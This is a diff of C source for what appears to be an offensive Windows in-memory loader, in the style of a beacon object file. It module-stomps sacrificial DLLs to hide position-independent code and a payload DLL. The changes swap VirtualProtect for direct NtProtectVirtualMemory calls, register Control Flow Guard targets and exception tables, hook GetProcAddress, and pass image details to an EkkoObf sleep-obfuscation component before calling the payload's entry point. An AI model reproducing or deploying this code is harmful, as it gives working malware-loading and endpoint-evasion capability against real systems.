@@ -1,5 +1,6 @@
 #include "loader.h"
 #include "stomp.h"
+#include "cfg.h"
 
 #define SAFE_FREE(ptr, size) \
     if (ptr) { \
@@ -53,13 +54,17 @@ void fix_section_permissions(DLLDATA *dll, char *base_addr) {
         DWORD new_prot = GetWin32Protection(section->Characteristics);
         DWORD old_prot = 0;
 
-        if (!KERNEL32$VirtualProtect(target_ptr, size, new_prot, &old_prot)) {
-            StealthDbg("Failed: Section %-8.8s (Error: %lu)\n", section->Name, KERNEL32$GetLastError());
+        SIZE_T region_size = (SIZE_T)size;
+        NTSTATUS status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &target_ptr, &region_size, new_prot, &old_prot);
+        if ( !SP_NT_SUCCESS(status) ) {
+            StealthDbg("Failed: Section %-8.8s (NTSTATUS: 0x%08X)\n", section->Name, status);
             continue;
         }
 
-        StealthDbg("Section %-8.8s | Prot: 0x%02lX | Addr: %p\n", section->Name, new_prot, target_ptr);
+        StealthDbg("Section %-8.8s | Prot: 0x%02lX | Addr: %p | size: 0x%lX\n", section->Name, new_prot, target_ptr, size);
     }
+
+    KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, base_addr, (SIZE_T)dll->NtHeaders->OptionalHeader.SizeOfImage);
 }
 
 
@@ -73,20 +78,21 @@ void go(void)
     char * pico_src = GETRESOURCE ( _PICO_ );
     PICO* pico_dst = NULL;
 #if MODE_STOMP
-    PICO_ARGS picoArgs;
-    RUNTIME_FUNCTION* pico_rf = (RUNTIME_FUNCTION*)KERNEL32$VirtualAlloc(NULL, MAX_PICO_FUNCS * sizeof(RUNTIME_FUNCTION), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    int pico_rf_count = 0;
-    picoArgs.pico_rf_storage = pico_rf;
-    picoArgs.pico_rf_count   = &pico_rf_count;
-    picoArgs.funcs = &funcs;
-    picoArgs.pico_src = pico_src;
-    picoArgs.pico_dst = &pico_dst;
-    picoArgs.sacrificialDll = PICO_STOMP_DLL;
+RUNTIME_FUNCTION* pico_rf = (RUNTIME_FUNCTION*)KERNEL32$VirtualAlloc(NULL, MAX_PICO_FUNCS * sizeof(RUNTIME_FUNCTION), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+int pico_rf_count = 0;
+    PICO_ARGS picoArgs = {
+        .pico_dst = &pico_dst,
+        .funcs = &funcs,
+        .pico_src = pico_src,
+        .sacrificialDll = PICO_STOMP_DLL,
+        .pico_rf_storage = pico_rf,
+        .pico_rf_count = &pico_rf_count
+    };
 
-    STOMP_ARGS stompArgs;
-    stompArgs.resourceType = rPICO;
-    stompArgs.picoArgs = picoArgs;
-
+    STOMP_ARGS stompArgs = {
+        .resourceType = rPICO,
+        .picoArgs = picoArgs
+    };
     StealthDbg("calling Stomp to load PICO code into sacrificial DLL...\n");
 
     if ( !Stomp(stompArgs) ) {
@@ -105,7 +111,8 @@ void go(void)
     KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );
 
 #endif
-    // /* call setup_hooks to overwrite funcs.GetProcAddress */
+    EnableCFGForPICO(pico_dst, pico_src);
+    /* call setup_hooks to overwrite funcs.GetProcAddress */
     ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_hooks ( ) ) ) ( &funcs );
 
     StealthDbg("setup_hooks called, proceeding to load and fixup DLL...\n");
@@ -125,23 +132,30 @@ void go(void)
     MSVCRT$memset( &stompArgs, 0, sizeof(stompArgs) );
 
     char* dll_dst = NULL;
-    DLL_ARGS dllArgs;
-    dllArgs.dll_data = &dll_data;
-    dllArgs.funcs = &funcs;
-    dllArgs.dll_src = &dll_src;
-    dllArgs.dll_dst = &dll_dst;
-    dllArgs.sacrificialDll = DLL_STOMP_DLL;
+    DLL_ARGS dllArgs = {
+        .dll_data = &dll_data,
+        .funcs = &funcs,
+        .dll_src = &dll_src,
+        .dll_dst = &dll_dst,
+        .sacrificialDll = DLL_STOMP_DLL
+    };
 
     stompArgs.resourceType = rDLL;
     stompArgs.dllArgs = dllArgs;
-
+    
     if ( !Stomp( stompArgs ) ) {
         StealthDbg("ERROR: StompDLL failed\n");
         KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);
         return;
     }
+    DWORD dllSize = SizeOfDLL(&dll_data);
+    ULONG_PTR loaderBase = (ULONG_PTR)go;  // or any function in loader.c
+    ULONG_PTR stompBase  = (ULONG_PTR)*(dllArgs.dll_dst);
+    ULONG_PTR stompEnd   = stompBase + dllSize;
+
+    StealthDbg("loader code at %p, stomp range %p-%p, overlap=%d\n", loaderBase, stompBase, stompEnd, (loaderBase >= stompBase && loaderBase < stompEnd));
 #else
-    char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
+    char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if (!dll_dst) {
         StealthDbg("ERROR: Failed to allocate memory for DLL (Error: %lu)\n", KERNEL32$GetLastError());
         SAFE_FREE(dll_src, masked_dll->len);
@@ -151,16 +165,26 @@ void go(void)
 
     ProcessImports ( &funcs, &dll_data, dll_dst );
 #endif
-    /* wipe and free the unmasked DLL copy — only dll_dst is needed from here */
+
+    /* wipe and free the unmasked DLL copy - only dll_dst is needed from here */
+    StealthDbg("about to SAFE_FREE dll_src=%p len=%u\n", dll_src, (unsigned)masked_dll->len);
     SAFE_FREE(dll_src, masked_dll->len);
-    /* re-parse from the mapped image since dll_src is gone */
-    ParseDLL ( dll_dst, &dll_data );
+    StealthDbg("SAFE_FREE done, re-parsing dll_dst=%p\n", dll_dst);
+    ParseDLL(dll_dst, &dll_data);
+    StealthDbg("ParseDLL done, SizeOfDLL=0x%X\n", SizeOfDLL(&dll_data));
 
-    /* tell the PICO (EkkoObf) which region is the DLL image */
-    ( ( SET_IMAGE_INFO ) PicoGetExport ( pico_src, pico_dst->code, __tag_set_image_info ( ) ) ) ( dll_dst, SizeOfDLL(&dll_data) );
+    SET_IMAGE_INFO _sii = (SET_IMAGE_INFO)PicoGetExport(pico_src, pico_dst->code, __tag_set_image_info());
+    StealthDbg("set_image_info export at %p, calling with dll_dst=%p size=0x%X\n",
+        (void*)_sii, dll_dst, SizeOfDLL(&dll_data));
+    _sii(dll_dst, SizeOfDLL(&dll_data));
+    StealthDbg("set_image_info returned OK\n");
 
-    StealthDbg ( "fixing section permissions...\n" );
+    StealthDbg("fixing section permissions...\n");
     fix_section_permissions(&dll_data, dll_dst);
+
+    /* CFG must be AFTER fix_section_permissions - pages must be PAGE_EXECUTE_* */
+    StealthDbg("marking CFG valid targets...\n");
+    EnableCFG(&dll_data, dll_dst);
 
     /* Register .pdata */
     IMAGE_DATA_DIRECTORY* pExcept = &dll_data.OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
@@ -169,32 +193,31 @@ void go(void)
         DWORD funcCount = pExcept->Size / sizeof(RUNTIME_FUNCTION);
         for (DWORD i = 0; i < min(funcCount, 5); i++) {
             StealthDbg(".pdata[%d]: Begin=%08X End=%08X UnwindInfo=%08X\n",
-                i,
-                pFuncTable[i].BeginAddress,
-                pFuncTable[i].EndAddress,
-                pFuncTable[i].UnwindData
-            );
-
+                i, pFuncTable[i].BeginAddress, pFuncTable[i].EndAddress, pFuncTable[i].UnwindData);
         }
-
         if (!KERNEL32$RtlAddFunctionTable(pFuncTable, funcCount, (DWORD_PTR)dll_dst)) {
             StealthDbg("RtlAddFunctionTable failed\n");
         } else {
             StealthDbg("Registered %lu exception handlers\n", funcCount);
         }
-    } else {
-        StealthDbg("No .pdata section, skipping\n");
     }
 
-    /* protect the PE header page as read-only */
     DWORD hdr_old_protect = 0;
-    KERNEL32$VirtualProtect ( dll_dst, dll_data.NtHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &hdr_old_protect );
-	KERNEL32$FlushInstructionCache((HANDLE)-1, dll_dst, SizeOfDLL(&dll_data));
+    //KERNEL32$VirtualProtect(dll_dst, dll_data.NtHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &hdr_old_protect);
+    SIZE_T header_region_size = (SIZE_T)dll_data.NtHeaders->OptionalHeader.SizeOfHeaders;
+    NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID*)&dll_dst, &header_region_size, PAGE_READONLY, &hdr_old_protect);
+    
+    KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, dll_dst, SizeOfDLL(&dll_data));
 
     StealthDbg("calling entry point...\n");
-
     DLLMAIN_FUNC entry_point = EntryPoint(&dll_data, dll_dst);
-    StealthDbg("entry_point=%p  dll_dst=%p  AOE=0x%X\n", (void*)entry_point, dll_dst, (unsigned)dll_data.NtHeaders->OptionalHeader.AddressOfEntryPoint);
+    StealthDbg("entry_point=%p  dll_dst=%p  AOE=0x%X\n",
+        (void*)entry_point, dll_dst, (unsigned)dll_data.NtHeaders->OptionalHeader.AddressOfEntryPoint);
 
-    entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, NULL);    
+    if (entry_point) {
+        entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, NULL);
+        StealthDbg("DLL entry point called successfully\n");
+    }
+
+    KERNEL32$WaitForSingleObject((HANDLE)(LONG_PTR)-1, 3000);
 }
